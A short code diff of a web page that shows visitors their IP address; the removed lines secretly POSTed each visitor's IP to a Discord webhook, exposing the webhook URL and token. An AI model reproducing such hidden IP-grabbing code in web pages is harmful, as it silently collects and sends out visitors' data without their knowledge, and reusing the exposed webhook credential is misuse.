@@ -9,22 +9,7 @@
 <body onload="getIP();">
     <script type="application/javascript">
         function getIP(json) {
-          document.write("Your IP address is ", json.ip, " lol");
-
-          const request = new XMLHttpRequest();
-          request.open("POST", "https://discord.com/api/webhooks/910285183457067058/KoTopmmoE78OyD97qIZ766cUYLpBzkEvGTrGN0iJgXy-F6wtWeHnBg8P4lb7kZ8lNtbs");
-    
-          request.setRequestHeader('Content-type', 'application/json');
-    
-          const params = {
-            username: "Funne Lol",
-            avatar_url: "",
-            content: json.ip
-          }
-    
-          request.send(JSON.stringify(params));
-        }
-        
+          document.write("Your IP address is ", json.ip, " lol");   
       </script>
       
       <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
